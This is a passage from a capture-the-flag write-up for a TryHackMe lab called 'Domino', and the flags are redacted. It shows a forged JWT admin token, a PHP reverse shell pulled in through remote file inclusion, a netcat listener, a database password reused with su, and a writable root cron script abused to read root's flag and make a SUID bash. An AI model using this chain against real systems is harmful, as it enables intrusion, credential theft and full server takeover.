function require_admin() {
    $user = require_login();
    if ($user['role'] !== 'admin') {
        http_response_code(403);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Forbidden']);
        exit;
    }
    return $user;
}

function generate_jwt($username) {
    $header = rtrim(base64_encode(json_encode(['alg'=>'HS256','typ'=>'JWT'])), '=');
    // Bug: role always set to "user" regardless of actual user role
    $payload = rtrim(base64_encode(json_encode([
        'sub' => $username,
        'role' => 'user',
        'iat' => time(),
        'exp' => time() + 3600
    ])), '=');
    $sig = rtrim(base64_encode(hash_hmac('sha256', "$header.$payload", JWT_SECRET, true)), '=');
    return "$header.$payload.$sig";
}

function verify_jwt($token) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) return null;
    $payload = json_decode(base64_decode($parts[1]), true);
    if (!$payload) return null;
    // Signature check intentionally disabled
    // $expected = rtrim(base64_encode(hash_hmac('sha256', "$parts[0].$parts[1]", JWT_SECRET, true)),'=');
    // if (!hash_equals($parts[2], $expected)) return null;
    if (isset($payload['exp']) && $payload['exp'] < time()) return null;
    return $payload;
}
?>
```

Yes, this is verified in the `verify_jwt` function. The signature checking is disabled.

```php
function verify_jwt($token) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) return null;
    $payload = json_decode(base64_decode($parts[1]), true);
    if (!$payload) return null;
    // Signature check intentionally disabled
    // $expected = rtrim(base64_encode(hash_hmac('sha256', "$parts[0].$parts[1]", JWT_SECRET, true)),'=');
    // if (!hash_equals($parts[2], $expected)) return null;
    if (isset($payload['exp']) && $payload['exp'] < time()) return null;
    return $payload;
}
```

---------------------------------------------------------------------------------------

#### What is the flag displayed on the admin panel after gaining admin access?

Our admin token also gives us access to the admin panel (`/admin`) we found earlier in the `gobuster` scan:

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -s -L -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYWphYyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4ODA4NjI3MiwiZXhwIjoxNzg4MDg5ODcyfQ.0XS3a0C5mxThCx46Ue5lSGHCkyaiKyVZ46o44KjVCpk" http://$TARGET_IP/admin
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Admin Panel - NexusCorp</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<nav class="navbar">
  <div class="nav-brand"><span class="logo-icon">&#9650;</span> NexusCorp Admin</div>
  <div class="nav-links">
    <a href="/dashboard.php">Portal</a>
    <a href="/logout.php">Logout</a>
  </div>
</nav>
<div class="container">
  <div class="admin-header">
    <h1>Administration Console</h1>
    <p>Logged in as: <strong>cajac</strong></p>
  </div>
  <div class="flag-box">
    <h3>System Status</h3>
    <p>Internal reference: <code>THM{<REDACTED>}</code></p>
  </div>
  <div class="card-grid">
    <div class="card">
      <h3>User Management</h3>
      <p>Manage employee accounts and permissions.</p>
      <a href="/api/users/profile.php?id=1" class="btn-secondary">View User API</a>
    </div>
    <div class="card">
      <h3>File System Access</h3>
      <p>Internal document viewer via authenticated API.</p>
      <p><small>GET /api/files.php?name=[path] with Bearer token</small></p>
    </div>
    <div class="card">
      <h3>Support Queue</h3>
      <p>Pending tickets requiring admin review.</p>
      <p><strong>0</strong> unread tickets</p>    </div>
  </div>
</div>
</body>
</html>
 
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -s -L -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYWphYyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4ODA4NjI3MiwiZXhwIjoxNzg4MDg5ODcyfQ.0XS3a0C5mxThCx46Ue5lSGHCkyaiKyVZ46o44KjVCpk" http://$TARGET_IP/admin | grep -oE 'THM{.*}'
THM{<REDACTED>}
```

Answer: `THM{<REDACTED>}`

---------------------------------------------------------------------------------------

#### Prepare a reverse shell

As a next step we would like to get a reverse shell. We will use the one from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ webshells 

> webshells ~ Collection of webshells

/usr/share/webshells
├── asp
├── aspx
├── cfm
├── jsp
├── laudanum -> /usr/share/laudanum
├── perl
└── php
┌──(kali㉿kali)-[/usr/share/webshells]
└─$ cd php    
 
┌──(kali㉿kali)-[/usr/share/webshells/php]
└─$ ls   
findsocket  php-backdoor.php  php-reverse-shell.php  qsd-php-backdoor.php  simple-backdoor.php
 
┌──(kali㉿kali)-[/usr/share/webshells/php]
└─$ cp php-reverse-shell.php /mnt/hgfs/Wargames/TryHackMe/Challenges/Medium/Domino 
 
┌──(kali㉿kali)-[/usr/share/webshells/php]
└─$ cd /mnt/hgfs/Wargames/TryHackMe/Challenges/Medium/Domino
 
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ vi php-reverse-shell.php 
 
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ head -n15 php-reverse-shell.php 
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.131.48';  // CHANGE THIS
$port = 12345;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;

```

Then we share it via HTTP:

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ python -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

And finally, we start a netcat listener.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ nc -lvnp 12345 
listening on [any] 12345 ...

```

#### Get a reverse shell

We will try [RFI](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#Remote_file_inclusion) via the files API to trigger the reverse shell.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ curl -s -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYWphYyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc4ODA4NjI3MiwiZXhwIjoxNzg4MDg5ODcyfQ.0XS3a0C5mxThCx46Ue5lSGHCkyaiKyVZ46o44KjVCpk" http://$TARGET_IP/api/files.php?name=http://192.168.131.48/php-reverse-shell.php

```

Back at our netcat listener, we now have a connection.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ nc -lvnp 12345 
listening on [any] 12345 ...
connect to [192.168.131.48] from (UNKNOWN) [10.81.166.197] 45010
Linux tryhackme-2404 6.17.0-1015-aws #15~24.04.1-Ubuntu SMP Thu May  7 17:00:14 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
 11:10:25 up  3:41,  0 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

#### Fix/upgrade the reverse shell

We don't have a proper shell though so let's fix that.

```bash
$ tty
not a tty
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@tryhackme-2404:/$ ^Z
zsh: suspended  nc -lvnp 12345
 
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Medium/Domino]
└─$ stty raw -echo ; fg ; reset 
[1]  + continued  nc -lvnp 12345

www-data@tryhackme-2404:/$ export SHELL=bash
www-data@tryhackme-2404:/$ export TERM=xterm-256color
www-data@tryhackme-2404:/$ stty rows 200 columns 200
www-data@tryhackme-2404:/$ ^C
www-data@tryhackme-2404:/$ 
```

Now we have a proper and stable shell that survives `Ctrl + C`.

---------------------------------------------------------------------------------------

#### What is the flag obtained after achieving remote code execution on the server?

Hint: Flag is stored in `/opt/flag3.txt`.

```bash
www-data@tryhackme-2404:/$ cat /opt/flag3.txt
THM{<REDACTED>}
www-data@tryhackme-2404:/$ 
```

Answer: `THM{<REDACTED>}`

---------------------------------------------------------------------------------------

#### What is the flag found in the devops user's home directory?

That was found before, there is a `devops` user on the machine.

```bash
www-data@tryhackme-2404:/$ ls -l /home
total 8
drwxr-x--- 3 devops devops 4096 May  9 17:19 devops
drwxr-xr-x 4 ubuntu ubuntu 4096 Apr 30 06:10 ubuntu
```

As the password, we should try password re-use of the password found in the `config.php` file.

```bash
www-data@tryhackme-2404:/$ cat /var/www/html/config.php | grep -i pass
define('DB_PASS', 'D3v0ps!2024');
    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);
www-data@tryhackme-2404:/$ su devops
Password: 
devops@tryhackme-2404:/$ id
uid=1001(devops) gid=1001(devops) groups=1001(devops)
```

And it worked! Now we can get the user flag.

```bash
devops@tryhackme-2404:/$ cd /home/devops/
devops@tryhackme-2404:~$ ls -la
total 32
drwxr-x--- 3 devops devops 4096 May  9 17:19 .
drwxr-xr-x 4 root   root   4096 Apr 29 09:37 ..
-rw------- 1 devops devops  317 May  9 17:19 .bash_history
-rw-r--r-- 1 devops devops  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 devops devops 3771 Feb 25  2020 .bashrc
drwx------ 2 devops devops 4096 Apr 30 15:44 .cache
-rw-r--r-- 1 devops devops  807 Feb 25  2020 .profile
-rw-r--r-- 1 devops devops   34 Apr 29 10:27 user.txt
devops@tryhackme-2404:~$ cat user.txt
THM{<REDACTED>}
devops@tryhackme-2404:~$ 
```

Answer: `THM{<REDACTED>}`

---------------------------------------------------------------------------------------

#### Enumeration for PrivEsc

Next, we enumerate the system for privilege escalation opportunities.

First we check what we can execute with `sudo`.

```bash
devops@tryhackme-2404:~$ sudo -l
[sudo] password for devops: 
Sorry, user devops may not run sudo on tryhackme-2404.
```

Nothing!

How about CRON-jobs?

```bash
devops@tryhackme-2404:~$ crontab -l
no crontab for devops
devops@tryhackme-2404:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
devops@tryhackme-2404:~$ grep "CRON" /var/log/syslog
grep: /var/log/syslog: Permission denied
devops@tryhackme-2404:~$ 
```

Nothing special.

Any scripts that are writable by us?

```bash
devops@tryhackme-2404:~$ find / -writable -iname '*.sh' -or -iname '*.csh' -or -iname '*.zsh' -or -iname '*.py' 2>/dev/null
/opt/monitoring/health_report.sh
/opt/admin_bot.py
/snap/core20/2866/etc/python3.8/sitecustomize.py
/snap/core20/2866/usr/lib/python3/dist-packages/_pyrsistent_version.py
/snap/core20/2866/usr/lib/python3/dist-packages/_version.py
/snap/core20/2866/usr/lib/python3/dist-packages/attr/__init__.py
<---snip--->
```

The first script seems to be executed every minute or so.

```bash
devops@tryhackme-2404:~$ ls -l /opt/monitoring/health_report.sh 
-rwxrwxr-- 1 root devops 537 May 18 10:41 /opt/monitoring/health_report.sh
devops@tryhackme-2404:~$ cat /opt/monitoring/health_report.sh 
#!/bin/bash
# NexusCorp Health Monitoring Script
LOG_FILE="/var/log/nexus_health.log"
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
echo "[$TIMESTAMP] Health check started" >> "$LOG_FILE"
systemctl is-active --quiet apache2 && echo "[$TIMESTAMP] Apache: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] Apache: DOWN" >> "$LOG_FILE"
systemctl is-active --quiet mysql && echo "[$TIMESTAMP] MySQL: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] MySQL: DOWN" >> "$LOG_FILE"
DISK=$(df -h / | awk "NR==2{print \$5}")
echo "[$TIMESTAMP] Disk: $DISK" >> "$LOG_FILE"
devops@tryhackme-2404:~$ tail /var/log/nexus_health.log 
[2026-08-30 11:49:01] MySQL: OK
[2026-08-30 11:49:01] Disk: 7%
[2026-08-30 11:50:01] Health check started
[2026-08-30 11:50:01] Apache: OK
[2026-08-30 11:50:01] MySQL: OK
[2026-08-30 11:50:01] Disk: 7%
[2026-08-30 11:51:01] Health check started
[2026-08-30 11:51:01] Apache: OK
[2026-08-30 11:51:01] MySQL: OK
[2026-08-30 11:51:01] Disk: 7%
devops@tryhackme-2404:~$ date
Sun Aug 30 11:52:00 UTC 2026
devops@tryhackme-2404:~$ 
```

But is it run by `root`? Let's update it to verify.

```bash
devops@tryhackme-2404:~$ echo -e '#!/bin/bash\nLOG_FILE="/var/log/nexus_health.log"\nid >> "$LOG_FILE"' > /opt/monitoring/health_report.sh
devops@tryhackme-2404:~$ cat /opt/monitoring/health_report.sh 
#!/bin/bash
LOG_FILE="/var/log/nexus_health.log"
id >> "$LOG_FILE"
devops@tryhackme-2404:~$ 
```

Then we check the log file

```bash
devops@tryhackme-2404:~$ tail -f /var/log/nexus_health.log 
[2026-08-30 12:02:01] Health check started
[2026-08-30 12:02:01] Apache: OK
[2026-08-30 12:02:01] MySQL: OK
[2026-08-30 12:02:01] Disk: 7%
[2026-08-30 12:03:01] Health check started
[2026-08-30 12:03:01] Apache: OK
[2026-08-30 12:03:01] MySQL: OK
[2026-08-30 12:03:01] Disk: 7%
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
^C
devops@tryhackme-2404:~$ 
```

Ha, it is executed by `root`.

---------------------------------------------------------------------------------------

#### What is the root flag?

A very quick-and-dirty way to get the flag is just to update the script to append the flag to the log file.

```bash
devops@tryhackme-2404:~$ echo -e '#!/bin/bash\nLOG_FILE="/var/log/nexus_health.log"\ncat /root/root.txt >> "$LOG_FILE"' > /opt/monitoring/health_report.sh
devops@tryhackme-2404:~$ cat /opt/monitoring/health_report.sh 
#!/bin/bash
LOG_FILE="/var/log/nexus_health.log"
cat /root/root.txt >> "$LOG_FILE"
devops@tryhackme-2404:~$ tail -f /var/log/nexus_health.log 
[2026-08-30 12:02:01] Disk: 7%
[2026-08-30 12:03:01] Health check started
[2026-08-30 12:03:01] Apache: OK
[2026-08-30 12:03:01] MySQL: OK
[2026-08-30 12:03:01] Disk: 7%
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
THM{<REDACTED>}
^C
devops@tryhackme-2404:~$ 
```

And there we have the final flag!

An alternate approach if we what a shell is to create a [SUID](https://en.wikipedia.org/wiki/Setuid) bash in our home directory.

```bash
devops@tryhackme-2404:~$ echo -e '#!/bin/bash\ncp /bin/bash /home/devops/cajac\nchmod +xs /home/devops/cajac' > /opt/monitoring/health_report.sh
devops@tryhackme-2404:~$ cat /opt/monitoring/health_report.sh 
#!/bin/bash
cp /bin/bash /home/devops/cajac
chmod +xs /home/devops/cajac
devops@tryhackme-2404:~$ ls -l
total 4
-rw-r--r-- 1 devops devops 34 Apr 29 10:27 user.txt
devops@tryhackme-2404:~$ pwd
/home/devops
devops@tryhackme-2404:~$ ls -l
total 4
-rw-r--r-- 1 devops devops 34 Apr 29 10:27 user.txt
devops@tryhackme-2404:~$ date
Sun Aug 30 12:16:05 UTC 2026
devops@tryhackme-2404:~$ ls -l
total 1420
-rwsr-sr-x 1 root   root   1446024 Aug 30 12:16 cajac
-rw-r--r-- 1 devops devops      34 Apr 29 10:27 user.txt
devops@tryhackme-2404:~$ ./cajac -p
cajac-5.2# id
uid=1001(devops) gid=1001(devops) euid=0(root) egid=0(root) groups=0(root),1001(devops)
cajac-5.2# 
```

---------------------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [API - Wikipedia](https://en.wikipedia.org/wiki/API)
- [bash - Linux manual page](https://www.man7.org/linux/man-pages/man1/bash.1.html)
- [Burp suite - Documentation](https://portswigger.net/burp/documentation)
- [Burp suite - Homepage](https://portswigger.net/burp)
- [cat - Linux manual page](https://man7.org/linux/man-pages/man1/cat.1.html)
- [cd - Linux manual page](https://man7.org/linux/man-pages/man1/cd.1p.html)
- [chmod - Linux manual page](https://man7.org/linux/man-pages/man1/chmod.1.html)
- [cp - Linux manual page](https://man7.org/linux/man-pages/man1/cp.1.html)
- [curl - Homepage](https://curl.se/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cURL - Wikipedia](https://en.wikipedia.org/wiki/CURL)
- [export - Linux manual page](https://www.man7.org/linux/man-pages/man1/export.1p.html)
- [file - Linux manual page](https://man7.org/linux/man-pages/man1/file.1.html)
- [File inclusion vulnerability - Wikipedia](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [Gobuster - GitHub](https://github.com/OJ/gobuster/)
- [Gobuster - Kali Tools](https://www.kali.org/tools/gobuster/)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [head - Linux manual page](https://man7.org/linux/man-pages/man1/head.1.html)
- [Hydra - GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Hydra - Kali Tools](https://www.kali.org/tools/hydra/)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [Insecure direct object reference - Wikipedia](https://en.wikipedia.org/wiki/Insecure_direct_object_reference)
- [JSON - Wikipedia](https://en.wikipedia.org/wiki/JSON)
- [JSON Web Token - Wikipedia](https://en.wikipedia.org/wiki/JSON_Web_Token)
- [jq - GitHub](https://github.com/jqlang/jq)
- [jq - Homepage](https://jqlang.org/)
- [jq - Linux manual page](https://manpages.ubuntu.com/manpages/xenial/man1/jq.1.html)
- [jwt.rocks - Homepage](https://jwt.rocks/)
- [ls - Linux manual page](https://man7.org/linux/man-pages/man1/ls.1.html)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [Nmap - Wikipedia](https://en.wikipedia.org/wiki/Nmap)
- [openssl - Linux manual page](https://linux.die.net/man/1/openssl)
- [OpenSSL - Wikipedia](https://en.wikipedia.org/wiki/OpenSSL)
- [PHP - Wikipedia](https://en.wikipedia.org/wiki/PHP)
- [php-reverse-shell.php - pentestmonkey - GitHub](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
- [Privilege escalation - Wikipedia](https://en.wikipedia.org/wiki/Privilege_escalation)
- [python - Linux manual page](https://linux.die.net/man/1/python)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [seq - Linux manual page](https://man7.org/linux/man-pages/man1/seq.1.html)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [stty - Linux manual page](https://man7.org/linux/man-pages/man1/stty.1.html)
- [su - Linux manual page](https://man7.org/linux/man-pages/man1/su.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [tail - Linux manual page](https://man7.org/linux/man-pages/man1/tail.1.html)
- [tty - Linux manual page](https://man7.org/linux/man-pages/man1/tty.1.html)
- [vi - Linux manual page](https://man7.org/linux/man-pages/man1/vi.1p.html)
- [webshells - Kali Tools](https://www.kali.org/tools/webshells/)
- [wget - Linux manual page](https://man7.org/linux/man-pages/man1/wget.1.html)
